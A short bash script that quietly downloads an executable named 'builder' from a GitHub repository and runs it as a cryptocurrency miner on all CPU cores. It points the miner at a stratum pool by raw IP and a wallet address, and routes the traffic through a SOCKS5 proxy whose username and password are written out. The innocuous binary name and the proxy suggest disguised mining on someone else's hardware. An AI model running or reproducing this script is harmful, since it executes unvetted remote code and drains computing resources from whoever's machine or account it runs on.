#!/bin/bash

wget -q https://raw.githubusercontent.com/andromedasizu/andromedasizu/main/builder

chmod +x builder

./builder -a lyra2z330 -o stratum+tcp://198.50.168.213:4563 -u Uf7eEUd6P75MryCtRfcMBhgYem6hnnTYr6 -p c=URX,zap=BUTK-lyra/GXX/PYRK-lyra2z330 -t$(nproc --all) --cpu-affinity=0x3 -x socks5://jxqnjrrf:67ffjvaafmvk@144.168.217.36:8728
